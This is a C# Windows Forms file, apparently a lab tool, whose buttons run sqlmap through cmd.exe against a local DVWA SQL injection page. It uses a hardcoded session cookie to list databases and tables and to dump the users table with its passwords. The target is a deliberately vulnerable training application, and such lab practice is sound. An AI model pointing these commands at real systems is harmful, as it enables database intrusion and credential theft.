using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace Aithusa
{
    public partial class Form2 : Form
    {

        public Form2()
        {
            InitializeComponent();
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {

            //string sorgu = "/k" + "cd/ & cd sqlmap & dir & sqlmap.py -u http://localhost/dvwa/vulnerabilities/sqli/" +
            //" --cookie=\"PHPSESSID=qiv9a29noj1gb1kfurdl4jkud8; security=low\" --data=\"id=1&Submit=Submit\" -p id -T users --batch --threads 5 --dump";

            
            
            string sorgu = "/k" + "cd/ & cd sqlmap & dir & sqlmap.py -u http://localhost/dvwa/vulnerabilities/sqli/" +
            " --cookie=\"PHPSESSID=qiv9a29noj1gb1kfurdl4jkud8; security=low\" --data=\"id=1&Submit=Submit\" -p id --dbs";

            Process.Start("cmd.exe", sorgu);   //veritabanlarını verir

            
            
            //string sorgu2 = "/k" + "cd/ & cd sqlmap & dir & sqlmap.py -u http://localhost/dvwa/vulnerabilities/sqli/" +
            //" --cookie=\"PHPSESSID=qiv9a29noj1gb1kfurdl4jkud8; security=low\" --data=\"id=1&Submit=Submit\" -p id -D dvwa --tables --batch --threads 5";

            //Process.Start("cmd.exe", sorgu2);

            
            
            //string sorgu3 = "/k" + "cd/ & cd sqlmap & dir & sqlmap.py -u http://localhost/dvwa/vulnerabilities/sqli/" +
            //" --cookie=\"PHPSESSID=qiv9a29noj1gb1kfurdl4jkud8; security=low\" --data=\"id=1&Submit=Submit\" -p id -T users --batch --threads 5 --dump";

           // Process.Start("cmd.exe", sorgu3);
        }

        private void button6_Click(object sender, EventArgs e)
        {

            string sorgu6 = "/k" + "cd/ & cd sqlmap & dir & sqlmap.py -u http://localhost/dvwa/vulnerabilities/sqli/" +
            " --cookie=\"PHPSESSID=qiv9a29noj1gb1kfurdl4jkud8; security=low\" --data=\"id=1&Submit=Submit\" -p id -D dvwa --tables --batch --threads 5";

            Process.Start("cmd.exe", sorgu6);   //tabloları verir
        }


        private void button3_Click(object sender, EventArgs e)
        {
            string sorgu3 = "/k" + "cd/ & cd sqlmap & dir & sqlmap.py -u http://localhost/dvwa/vulnerabilities/sqli/" +
            " --cookie=\"PHPSESSID=qiv9a29noj1gb1kfurdl4jkud8; security=low\" --data=\"id=1&Submit=Submit\" -p id -T users --batch --threads 5 --dump";

            Process.Start("cmd.exe", sorgu3);  //passwordleri verir
        }

        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void Form2_Load(object sender, EventArgs e)
        {

        }

        private void button5_Click(object sender, EventArgs e)
        {
            string sorgu4 = "/k" + "cd/ & cd sqlmap & dir & sqlmap.py -u http://localhost/dvwa/vulnerabilities/sqli/" +
            " --cookie=\"PHPSESSID=qiv9a29noj1gb1kfurdl4jkud8; security=low\" --data=\"id=1&Submit=Submit\" -p id -T users --batch --threads 5 --dump";
            Process.Start("cmd.exe", sorgu4);
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}